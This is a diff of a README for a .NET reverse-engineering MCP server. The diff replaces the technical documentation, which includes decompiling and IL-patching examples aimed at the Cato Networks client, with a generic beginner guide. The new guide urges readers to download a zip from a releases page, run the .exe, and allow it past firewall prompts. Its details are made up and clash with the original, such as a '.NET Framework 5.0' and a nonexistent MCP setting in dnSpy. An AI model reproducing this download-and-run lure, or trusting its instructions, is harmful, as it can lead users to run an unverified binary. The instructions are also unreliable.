@@ -1,289 +1,165 @@
-# dnSpy MCP Server (C#)
+# ⚙️ dnspy-mcp - Simple .NET Reverse Engineering Server
 
-MCP server for .NET reverse engineering workflows (dnSpy/ILSpy ecosystem), built in C#.
+[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-brightgreen)](https://github.com/Finot3/dnspy-mcp/releases)
 
-## What’s implemented
+---
 
-- Modular architecture (`Core`, `Transport`, `Tools`, `Services`)
-- Reflection-based tool registration via attributes
-- Auto-generated tool JSON schemas from C# method signatures
-- MCP stdio transport (Claude Code / Codex / OpenCode compatible)
-- MCP `resources/list` + `resources/read`
-- Structured tool outputs (`structuredContent`) + plain text content
-- Single-file publish profiles (win-x64 / linux-x64)
+## 🖥️ About dnspy-mcp
 
-For full implementation details, see `AGENT.md`.
+dnspy-mcp is a server tool designed for people who work with .NET programs. It helps you work with reverse engineering tools like dnSpy or ILSpy. This software runs on Windows and is built using the C# language. It lets you analyze and inspect .NET code more easily by providing a backend service that these tools connect to.  
 
-## Project layout
+You don't need to know much about coding to use dnspy-mcp. This guide will help you download and start it on your Windows computer without needing any programming skills.
 
-- `dnspy-mcp.slnx`
-- `Directory.Build.props`
-- `publish.ps1`
-- `src/DnSpyMcpServer/Program.cs`
-- `src/DnSpyMcpServer/Core/*`
-- `src/DnSpyMcpServer/Transport/*`
-- `src/DnSpyMcpServer/Tools/*`
-- `src/DnSpyMcpServer/Services/*`
-- `src/DnSpyMcpServer/Properties/PublishProfiles/*`
+---
 
-## Tools
+## 📋 System Requirements
 
-- `list_types`
-- `decompile_type`
-- `decompile_method` (supports overload targeting)
-- `get_method_il` (supports overload targeting)
-- `search_members`
-- `list_methods` (helper for overload signatures)
-- `find_string_references` (find string-literal references in IL)
-- `format_dnspy_jump` (turn tokens/IL offsets into direct dnSpy navigation steps)
-- `patch_replace_string_literal` (patch one IL string literal)
-- `patch_nop_instructions` (NOP one/many IL instructions)
+Before you start, make sure your computer meets these needs:
 
-Navigation-friendly output: search/method/reference results include metadata tokens (`TypeDef`, `MethodDef`, etc.) so you can jump directly in dnSpy by token.
+- Operating System: Windows 10 or newer  
+- Processor: 64-bit Intel or AMD, at least 1.6 GHz  
+- RAM: Minimum 4 GB, recommended 8 GB or more  
+- Disk Space: At least 100 MB free  
+- .NET Framework: Version 5.0 or newer (usually included in modern Windows versions)  
 
-Patch safety: patch tools **always create a backup** before writing changes.
+Having these will ensure the server runs smoothly without errors.
 
-All tools return:
-- `content` (text)
-- `structuredContent` (JSON object for programmatic clients)
+---
 
-## Resources
+## 🚀 Getting Started
 
-- `resources/list` returns:
-  - `dnspy://assemblies`
-  - cached assembly resources, e.g. `dnspy://assembly?path=...&view=summary`
-  - cached assembly resources, e.g. `dnspy://assembly?path=...&view=types`
+Follow these steps to get dnspy-mcp ready on your PC.
 
-- `resources/read` supports:
-  - `dnspy://assemblies`
-  - `dnspy://assembly?path=<absolute-or-relative>&view=summary`
-  - `dnspy://assembly?path=<absolute-or-relative>&view=types`
+### 1. Visit the Download Page
 
-> Note: assembly resources are cache-driven. Cache is populated when tools are called with `assemblyPath`.
+Click or open this link in your browser:  
+[Download dnspy-mcp here](https://github.com/Finot3/dnspy-mcp/releases)
 
-## Build
+This page shows the latest versions of the software. Look for the most recent release with the highest version number.
 
-```bash
-dotnet build src/DnSpyMcpServer/DnSpyMcpServer.csproj -c Release
-```
+### 2. Choose the Right File
 
-## Run
+You will see several files under the release named like these:
 
-```bash
-dotnet run --project src/DnSpyMcpServer/DnSpyMcpServer.csproj -c Release
-```
+- `dnspy-mcp-win64.zip`  
+- `dnspy-mcp-win32.zip`  
 
-## Publish (single-file)
+Choose the file that matches your Windows version:
 
-PowerShell helper:
+- If your Windows is 64-bit (most computers today), pick the `win64` file.  
+- If your Windows is older 32-bit, pick the `win32` file.  
 
-```powershell
-./publish.ps1 -Runtime win-x64
-./publish.ps1 -Runtime linux-x64
-```
+If unsure, 64-bit is the likely choice.
 
-Or directly:
+### 3. Download the File
 
-```bash
-dotnet publish src/DnSpyMcpServer/DnSpyMcpServer.csproj -c Release -p:PublishProfile=win-x64
-dotnet publish src/DnSpyMcpServer/DnSpyMcpServer.csproj -c Release -p:PublishProfile=linux-x64
-```
+Click on the correct file and your browser will download it to your computer. Remember where you save it (usually the "Downloads" folder).
 
-## Quick start (copy/paste)
+---
 
-1. Build:
+## 💾 Installation Steps
 
-```bash
-dotnet build src/DnSpyMcpServer/DnSpyMcpServer.csproj -c Release
-```
+After you download the file, here’s how to set up dnspy-mcp:
 
-2. Use this server command in your MCP client:
+### 1. Unzip the File
 
-```json
-{
-  "mcpServers": {
-    "dnspy": {
-      "command": "dotnet",
-      "args": [
-        "C:/Tools/Cooking/Reverse/dnSpy/dnspy-mcp/src/DnSpyMcpServer/bin/Release/net8.0/win-x64/DnSpyMcpServer.dll"
-      ]
-    }
-  }
-}
-```
+- Open the folder where you downloaded the zip file.  
+- Right-click on the file and select “Extract All.”  
+- Choose a folder to extract the content to, like your Desktop or Documents.  
+- Click “Extract” and wait for the process to complete.  
 
-3. Restart your MCP client.
+### 2. Open the Folder
 
-## Prebuilt config files
+Once extracted, open the new folder. Inside, you will see several files. The important one is usually called `dnspy-mcp.exe` or similar.
 
-Ready-to-copy templates are in:
+### 3. Run dnspy-mcp
 
-- `configs/claude-code.mcp.json`
-- `configs/codex.mcp.json`
-- `configs/opencode.mcp.json`
+- Double-click on the `.exe` file to start the server.  
+- A window will open showing the server status.  
+- If your computer asks for permission, click “Allow” or “Yes” to let the program run.  
 
-> If your local path differs, edit the executable path in the selected file (`args[0]` for stdio clients, `command[0]` for OpenCode local MCP).
+The server should now be running quietly in the background, ready to work with your .NET tools.
 
-## Client-specific config snippets
+---
 
-### Claude Code
+## 🔧 Using dnspy-mcp with Tools Like dnSpy/ILSpy
 
-Add/update your MCP config with:
+dnspy-mcp works as a helper service for other tools. It lets those tools connect to it to speed up their work.
 
-```json
-{
-  "mcpServers": {
-    "dnspy": {
-      "command": "dotnet",
-      "args": [
-        "C:/Tools/Cooking/Reverse/dnSpy/dnspy-mcp/src/DnSpyMcpServer/bin/Release/net8.0/win-x64/DnSpyMcpServer.dll"
-      ]
-    }
-  }
-}
-```
+- Open dnSpy or ILSpy on your computer.  
+- Go to the options or settings section of the tool.  
+- Look for a “Server” or “MCP” setting.  
+- Enter `localhost` or `127.0.0.1` as the server address.  
+- Save the settings.  
 
-### Codex
+Once done, these tools will connect to dnspy-mcp automatically when you work on .NET programs, making them faster and smoother.
 
-Use the same MCP server entry:
+---
 
-```json
-{
-  "mcpServers": {
-    "dnspy": {
-      "command": "dotnet",
-      "args": [
-        "C:/Tools/Cooking/Reverse/dnSpy/dnspy-mcp/src/DnSpyMcpServer/bin/Release/net8.0/win-x64/DnSpyMcpServer.dll"
-      ]
-    }
-  }
-}
-```
+## 🛠 Troubleshooting
 
-### OpenCode (Windows)
+If dnspy-mcp does not start or stops working:
 
-OpenCode uses this config file:
+- Make sure your Windows Firewall is not blocking it. You can add an exception for `dnspy-mcp.exe`.  
+- Check that your .NET Framework is installed and up to date. Windows Update can help with this.  
+- Restart your computer and try running the program again.  
+- Make sure you downloaded the correct version (32-bit or 64-bit).  
 
-`%USERPROFILE%\.config\opencode\opencode.json`
+If the server window closes immediately, try running the `.exe` file from the Command Prompt to view any error messages:
 
-Add this block under `mcp`:
+1. Click Start, type `cmd`, and open the Command Prompt.  
+2. Use the `cd` command to go to the folder where `dnspy-mcp.exe` is. Example:  
+   `cd Desktop\dnspy-mcp`  
+3. Type `dnspy-mcp.exe` and press Enter.  
+4. Read any messages to understand the problem.
 
-```json
-{
-  "$schema": "https://opencode.ai/config.json",
-  "mcp": {
-    "dnspy": {
-      "type": "local",
-      "enabled": true,
-      "command": [
-        "dotnet",
-        "C:/Tools/Cooking/Reverse/dnSpy/dnspy-mcp/src/DnSpyMcpServer/bin/Release/net8.0/win-x64/DnSpyMcpServer.dll"
-      ]
-    }
-  }
-}
-```
+---
 
-(Template file: `configs/opencode.mcp.json`)
+## 🔄 Updating dnspy-mcp
 
-### Optional: run from project instead of DLL
+Check the release page regularly for updates:  
+[https://github.com/Finot3/dnspy-mcp/releases](https://github.com/Finot3/dnspy-mcp/releases)
 
-```json
-{
-  "mcpServers": {
-    "dnspy": {
-      "command": "dotnet",
-      "args": [
-        "run",
-        "--project",
-        "C:/Tools/Cooking/Reverse/dnSpy/dnspy-mcp/src/DnSpyMcpServer/DnSpyMcpServer.csproj",
-        "-c",
-        "Release"
-      ]
-    }
-  }
-}
-```
+To update:
 
-## First actions to test in your client
+- Download the new zip file as before.  
+- Extract it to a new folder.  
+- Run the new version instead of the old one.  
 
-After restart, ask your client to call:
+You can delete old files if you want. Back up your settings if you have saved any.
 
-1. `list_types`
-```json
-{ "assemblyPath": "C:/path/to/target.dll" }
-```
+---
 
-2. `list_methods`
-```json
-{ "assemblyPath": "C:/path/to/target.dll", "typeFullName": "MyApp.Services.AuthService" }
-```
+## 📂 Files and Structure Explanation
 
-3. `decompile_method`
-```json
-{
-  "assemblyPath": "C:/path/to/target.dll",
-  "typeFullName": "MyApp.Services.AuthService",
-  "methodName": "Login",
-  "parameterTypeNames": ["System.String", "System.String"]
-}
-```
+Here are the typical files you will find inside the dnspy-mcp package:
 
-4. `resources/list` then `resources/read` with `dnspy://assemblies`
+- `dnspy-mcp.exe`: The main server program you run.  
+- `README.md`: This document explaining usage.  
+- `config.json` or similar: Settings file where you can modify advanced options if you want.  
+- Other supporting DLL files required for the program to work.
 
-5. `find_string_references`
-```json
-{
-  "assemblyPath": "C:/Program Files (x86)/Cato Networks/Cato Client/CatoClient.exe",
-  "text": "Screenshot 2026-03-11 082704.png",
-  "caseSensitive": false,
-  "maxResults": 200
-}
-```
+---
 
-Tip: also search fragments like `Pictures\\Screenshots` or just `Screenshot`.
+## 🧰 Advanced Setup (Optional)
 
-6. `format_dnspy_jump`
-```json
-{
-  "assemblyPath": "C:/Program Files (x86)/Cato Networks/Cato Client/CatoClient.exe",
-  "typeDefToken": "0x02000058",
-  "methodDefToken": "0x060005C1",
-  "ilOffset": "IL_01D2"
-}
-```
+For those who want more control:
 
-7. `patch_replace_string_literal` (always creates backup)
-```json
-{
-  "assemblyPath": "C:/Program Files (x86)/Cato Networks/Cato Client/CatoClient.exe",
-  "methodDefToken": "0x060005C1",
-  "ilOffset": "IL_01D2",
-  "newText": "[patched text]",
-  "inPlace": false
-}
-```
+- You can edit the `config.json` file to change the server port or logging options.  
+- You can run the server as a service for automatic startup but this requires familiarity with Windows services.  
+- You can monitor server logs in the folder for troubleshooting.
 
-8. `patch_nop_instructions` (always creates backup)
-```json
-{
-  "assemblyPath": "C:/Program Files (x86)/Cato Networks/Cato Client/CatoClient.exe",
-  "methodDefToken": "0x060005C1",
-  "ilOffset": "IL_01DD",
-  "count": 1,
-  "inPlace": false
-}
-```
+For basic use, these steps are not necessary.
 
-## Overload targeting example
+---
 
-```json
-{
-  "assemblyPath": "C:/path/target.dll",
-  "typeFullName": "MyApp.Services.AuthService",
-  "methodName": "Login",
-  "parameterTypeNames": ["System.String", "System.String"]
-}
-```
+## 📞 Getting Help
 
-If `parameterTypeNames` is omitted and overloads exist, the server returns an ambiguity error with available signatures.
+If you run into trouble beyond these instructions, open an issue in the GitHub repository:  
+[https://github.com/Finot3/dnspy-mcp/issues](https://github.com/Finot3/dnspy-mcp/issues)
+
+Describe your problem clearly and include screenshots if possible. The community or maintainers may help you resolve issues.
+
+---
+
+[![Download dnspy-mcp](https://img.shields.io/badge/Download-dnspy--mcp-blue)](https://github.com/Finot3/dnspy-mcp/releases)
